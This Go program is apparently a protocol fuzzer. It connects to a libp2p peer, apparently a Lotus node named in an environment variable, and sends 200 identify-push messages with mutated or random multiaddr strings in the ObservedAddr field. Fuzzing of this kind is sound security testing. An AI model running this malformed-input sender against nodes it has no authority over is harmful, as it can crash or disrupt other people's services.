//go:build go1.18
// +build go1.18

package main

import (
	"context"
	"fmt"
	"math/rand"
	"os"
	"time"

	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/p2p/protocol/identify"
	pb "github.com/libp2p/go-libp2p/p2p/protocol/identify/pb"
	"github.com/libp2p/go-msgio/protoio"
	ma "github.com/multiformats/go-multiaddr"
)

func MutateString(s string) string {
	runes := []rune(s)
	if len(runes) == 0 {
		return s
	}
	switch rand.Intn(3) {
	case 0:
		pos := rand.Intn(len(runes))
		char := rune(rand.Intn(94) + 33)
		return string(append(runes[:pos], append([]rune{char}, runes[pos:]...)...))
	case 1:
		if len(runes) > 1 {
			pos := rand.Intn(len(runes))
			return string(append(runes[:pos], runes[pos+1:]...))
		}
	case 2:
		pos := rand.Intn(len(runes))
		runes[pos] = rune(rand.Intn(94) + 33)
		return string(runes)
	}
	return s
}

func RandomString(n int) string {
	b := make([]byte, n)
	for i := 0; i < n; i++ {
		b[i] = byte(rand.Intn(256))
	}
	return string(b)
}

func reverseString(s string) string {
	runes := []rune(s)
	for i, j := 0, len(runes)-1; i < j; i, j = i+1, j-1 {
		runes[i], runes[j] = runes[j], runes[i]
	}
	return string(runes)
}

func duplicateString(s string) string {
	return s + s
}

func randomMutation(s string) string {
	switch rand.Intn(4) {
	case 0:
		return MutateString(s)
	case 1:
		return reverseString(s)
	case 2:
		return duplicateString(s)
	case 3:
		return RandomString(rand.Intn(50) + 1)
	}
	return s
}

func main() {
	rand.Seed(time.Now().UnixNano())

	target, ok := os.LookupEnv("LOTUS_TARGET")
	if !ok {
		fmt.Println("LOTUS_TARGET environment variable not set")
		os.Exit(1)
	}

	// Additional seed multiaddresses added.
	seeds := []string{
		"/ip4/127.0.0.1/tcp/4001",
		"/ip4/192.168.1.1/tcp/1234",
		"/ip4/10.0.0.1/tcp/4001",
		"/ip4/10.0.0.2/tcp/4001",
		"/ip6/::1/tcp/4001",
		"/ip6/::2/tcp/4001",
		"/ip6zone/0",
	}

	ctx := context.Background()
	sender, err := libp2p.New()
	if err != nil {
		fmt.Printf("failed to create sender host: %v\n", err)
		os.Exit(1)
	}
	defer sender.Close()

	targetMaddr, err := ma.NewMultiaddr(target)
	if err != nil {
		fmt.Printf("failed to parse LOTUS_TARGET multiaddr: %v\n", err)
		os.Exit(1)
	}
	ai, err := peer.AddrInfoFromP2pAddr(targetMaddr)
	if err != nil {
		fmt.Printf("failed to extract peer info from LOTUS_TARGET multiaddr: %v\n", err)
		os.Exit(1)
	}

	if err := sender.Connect(ctx, *ai); err != nil {
		fmt.Printf("failed to connect to target: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("Connected to target: %s\n", ai.ID)

	time.Sleep(time.Duration(rand.Intn(100)+50) * time.Millisecond)

	iterations := 200

	for i := 0; i < iterations; i++ {
		var payload string
		if rand.Float32() < 0.8 {
			seed := seeds[rand.Intn(len(seeds))]
			payload = randomMutation(seed)
		} else {
			payload = RandomString(rand.Intn(50) + 1)
		}
		fmt.Printf("Iteration %d: sending payload: %q\n", i, payload)

		time.Sleep(time.Duration(rand.Intn(100)+50) * time.Millisecond)

		stream, err := sender.NewStream(ctx, ai.ID, identify.IDPush)
		if err != nil {
			fmt.Printf("Iteration %d: failed to open stream: %v\n", i, err)
			continue
		}

		writer := protoio.NewDelimitedWriter(stream)
		msg := &pb.Identify{
			ObservedAddr: []byte(payload),
		}
		if err := writer.WriteMsg(msg); err != nil {
			fmt.Printf("Iteration %d: failed to write Identify message: %v\n", i, err)
			stream.Reset()
			fmt.Printf("Message: %+v\n", msg)
			continue
		}
		if err := stream.CloseWrite(); err != nil {
			fmt.Printf("Iteration %d: failed to close stream write: %v\n", i, err)
		}
		stream.Close()
		time.Sleep(10 * time.Millisecond)
	}
}
